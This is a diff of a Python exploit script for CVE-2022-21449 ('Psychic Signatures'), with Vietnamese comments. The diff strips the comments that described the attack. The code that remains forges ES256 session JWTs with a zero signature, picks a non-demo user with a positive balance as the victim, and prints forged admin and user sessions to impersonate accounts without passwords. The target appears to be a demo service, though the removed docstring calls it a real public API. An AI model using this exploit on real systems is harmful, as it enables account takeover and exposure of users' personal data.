@@ -1,21 +1,11 @@
-"""TẤN CÔNG 2 — PSYCHIC SIGNATURES / CVE-2022-21449 (qua HTTP, API công khai thật).
-
-Chế tạo token phiên với chữ ký RỖNG (r=0, s=0). Server bỏ kiểm tra r,s ∈ [1,n-1]
-nên chấp nhận -> mạo danh tài khoản BẤT KỲ mà không cần mật khẩu: chiếm quyền admin
-để lộ toàn bộ hồ sơ PII, và giả mạo phiên đăng nhập của người dùng khác.
-
-    python attack_psychic.py
-"""
 import json
 
 from common import get, b64u, money
 
-# Các tài khoản demo (bỏ qua khi chọn "một user thường khác" để mạo danh)
 DEMO = {"alice", "bob", "carlos", "admin"}
 
 
 def forge_token(user, role):
-    """JWT phiên với chữ ký RỖNG (r=s=0) cho tài khoản/vai trò tùy ý."""
     header = {"alg": "ES256", "typ": "JWT"}
     payload = {"user": user, "role": role}
     h = b64u(json.dumps(header, separators=(",", ":")).encode())
@@ -46,7 +36,6 @@ def main():
     if len(accts) > 8:
         print(f"  … và {len(accts) - 8} hồ sơ khác")
 
-    # Giả mạo JWT phiên: 1 cho admin, 1 cho một user thường
     victim = next((a["user"] for a in accts
                    if a["role"] == "user" and a["user"] not in DEMO and a["balance"] > 0), None)
     print("\nGiả mạo JWT phiên (chữ ký (0,0)) — mạo danh tài khoản, không cần mật khẩu:")
